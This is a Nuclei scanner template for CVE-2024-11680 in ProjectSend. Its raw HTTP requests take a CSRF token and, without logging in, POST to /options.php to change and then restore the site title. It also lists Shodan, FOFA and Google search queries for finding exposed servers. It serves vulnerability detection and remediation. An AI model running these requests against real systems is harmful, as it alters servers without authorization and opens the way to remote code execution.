flow: http(1) && http(2) && http(3) && http(4) && http(5)
http:
- extractors:
  - group: 1
    internal: true
    name: csrf
    regex:
    - name="csrf_token" value="([0-9a-z]+)"
    type: regex
  - group: 1
    internal: true
    name: title
    regex:
    - <title>Log in &raquo; ([0-9a-zA-Z]+)<\/title>
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "projectsend")
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 500
    - contains(content_type, "text/html")
    internal: true
    type: dsl
  raw:
  - 'POST /options.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    csrf_token={{csrf}}&section=general&this_install_title={{string}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "{{string}}")
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 500
    - contains(content_type, "text/html")
    internal: true
    type: dsl
  raw:
  - 'POST /options.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    csrf_token={{csrf}}&section=general&this_install_title={{title}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "{{title}}")
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-11680
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:projectsend:projectsend:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-11680
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287,CWE-863
    epss-percentile: 0.99776
    epss-score: 0.93112
  description: 'An improper authorization check was identified within ProjectSend
    version r1605 that allows an attacker to perform sensitive actions such as enabling
    user registration and auto validation, or adding new entries in the whitelist
    of allowed extensions for uploaded files. Ultimately, this allows to execute arbitrary
    PHP code on the server hosting the application.

    '
  impact: 'Unauthenticated attackers can bypass authorization checks to perform sensitive
    actions such as enabling user registration, modifying whitelists, and ultimately
    achieving remote code execution.

    '
  metadata:
    fofa-query:
    - body="projectsend"
    - body="projectsend setup"
    - body=provided by projectsend
    google-query: intext:provided by projectsend
    max-request: 1
    product: projectsend
    shodan-query:
    - http.html:"projectsend"
    - http.html:"projectsend setup"
    - http.html:"provided by projectsend"
    vendor: projectsend
    verified: true
  name: ProjectSend <= r1605 - Improper Authorization
  reference:
  - https://www.projectsend.org/
  - https://www.synacktiv.com/sites/default/files/2024-07/synacktiv-projectsend-multiple-vulnerabilities.pdf
  - https://vulncheck.com/advisories/projectsend-bypass
  remediation: 'Upgrade ProjectSend to version r1700 or later.

    '
  severity: critical
  tags: cve,cve2024,projectsend,auth-bypass,intrusive,kev,vkev,vuln
variables:
  string: '{{randstr}}'
